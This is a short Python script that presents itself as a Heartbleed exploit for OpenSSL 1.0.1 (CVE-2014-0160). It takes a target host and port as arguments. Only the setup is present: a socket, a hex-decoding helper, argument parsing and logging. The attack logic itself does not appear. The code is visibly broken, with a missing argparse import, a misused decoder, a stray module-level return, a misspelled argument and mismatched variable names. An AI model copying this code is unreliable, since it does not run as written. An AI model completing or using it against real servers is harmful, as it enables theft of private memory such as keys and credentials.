import socket
import pyfancy
import codecs
import logging

conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def h2bin(x):
    x.replace(' ', '').replace('\n', '')
    x = codecs.getdecoder('hex_codec')

return x

parse = argparse.ArgumentParser(decription='Heartbleed exploit /OpenSSL 1.0.1 vulnerability/CVE-2014-0160')

parse.add_argument('host', help = 'Target IP',type=str)
parse.add_argument('port',help='Port to connect to',type =int)
parse.set_defaults(port=443)

args = parser.parse_args()

logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
